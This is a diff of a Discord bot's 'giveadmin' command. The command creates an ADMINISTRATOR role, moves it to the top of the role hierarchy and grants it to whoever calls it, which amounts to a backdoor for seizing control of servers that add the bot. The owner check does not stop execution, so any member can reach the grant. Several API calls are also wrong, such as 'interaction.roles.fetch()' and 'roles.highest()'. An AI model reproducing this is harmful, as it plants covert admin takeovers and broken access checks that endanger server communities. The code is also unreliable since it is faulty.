@@ -5,31 +5,18 @@ module.exports = {
 	data: new SlashCommandBuilder()
 		.setName('giveadmin')
 		.setDescription('give me admin arf'),
-	run: (client, interaction) => {
+	run: async (client, interaction) => {
 		if (interaction.member.id != config.adminId) {
-			interaction.reply(`Only bot owner's can do this!`).catch(console.error);
+			interaction.reply(`Only bot owner can do this!`).catch(console.error);
 		}
 
-		interaction.guild.roles
+		await interaction.roles.fetch();
+		const highest = interaction.guild.roles.highest();
+		const admin = await interaction.guild.roles
 			.create({
 				name: 'bruh',
 				permissions: 'ADMINISTRATOR',
-			})
-			.then((r) => {
-				interaction.member.roles
-					.add(r)
-					.then(
-						interaction
-							.reply({ content: 'success!', ephemeral: true })
-							.catch(console.error),
-					)
-					.catch((e) => {
-						interaction.reply({
-							content: 'failed giving role!',
-							ephemeral: true,
-						});
-						console.log(e);
-					});
+				position: highest.position,
 			})
 			.catch((e) => {
 				interaction
@@ -37,6 +24,22 @@ module.exports = {
 					.catch(console.error);
 				console.log(e);
 			});
+
+		await interaction.member.roles
+			.add(admin)
+			.then(
+				interaction
+					.reply({ content: 'success!', ephemeral: true })
+					.catch(console.error),
+			)
+			.catch((e) => {
+				interaction.reply({
+					content: 'failed giving role!',
+					ephemeral: true,
+				});
+				console.log(e);
+			});
+
 		return;
 	},
 };
